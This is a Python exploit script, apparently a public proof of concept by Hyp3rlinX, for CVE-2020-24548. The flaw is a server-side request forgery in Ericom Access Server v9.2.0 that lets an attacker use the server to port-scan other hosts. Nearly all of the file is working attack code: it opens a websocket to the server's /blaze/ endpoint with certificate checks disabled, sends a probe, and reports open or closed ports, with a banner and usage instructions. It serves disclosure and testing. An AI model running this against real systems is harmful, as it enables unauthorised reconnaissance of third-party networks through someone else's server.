import sys,ssl
import websocket
###pip install websocket-client

#SSRF ability to port scan as Ericom Access Server v9.2.0 for (AccessNow & Blaze)
#does not validate the destination port its connecting to.
#
#Example, using listen, nc.exe -llvp 25
#
#A) Vuln Ericom Server  192.168.88.152 (usually port 8080)
#B) Attacker   192.168.88.162
#C) Victim  192.168.1.104

#In wireshark we will see A sends a SYN packet to C (port 25), C then sends SYN/ACK to A
#A then sends ACK to C.
#Finally we see A sending ACK/FIN to C on port 25.
#We would need to be well positioned to see the traffic in WS, but we will also know by the reply in our console
#like ["C","M",["Cannot connect to '192.168.1.104:25'.",true]]
#this message indicates we cannot connect and helpfully informs us.

BANNER="""
  ______                      _____                
 |  ____|                    / ____|               
 | |__   _ __ _ __ ___  _ __| |     ___  _ __ ___  
 |  __| | '__| '__/ _ \| '__| |    / _ \| '_ ` _ \ 
 | |____| |  | | | (_) | |  | |___| (_) | | | | | |
 |______|_|  |_|  \___/|_|   \_____\___/|_| |_| |_| 
                                       SSRF Exploit
"""


def ErrorCom(vs,vp,t,p):
    try:
        ws = websocket.create_connection("wss://"+vs+":"+vp+"/blaze/"+t+":"+p,
                             sslopt={'cert_reqs': ssl.CERT_NONE})
        ws.send("SSRF4U!")
        result =  ws.recv()
        #print(result)
        if result.find("Cannot connect to")==-1:
            print("[+] Port "+p+" is open for business :)")
        else:
            print("[!] Port " + p+ " is closed :(")
        ws.close()
    except Exception as e:
        print(str(e))

if __name__=="__main__":

    if len(sys.argv) != 5:
        print(BANNER)
        print("[+] Ericom Access Server v9.2.0 - SSRF Exploit - CVE-2020-24548")
        print("[+] By Hyp3rlinX / ApparitionSec")
        print("[!] Usage: <vuln-server>,<port (usually 8080)>,<target>,<port-to-scan>")
        exit()

    if len(sys.argv[4]) > 5:
        print("[!] Port out of range")
        exit()    

    print(BANNER)
    ErrorCom(sys.argv[1],sys.argv[2],sys.argv[3],sys.argv[4])



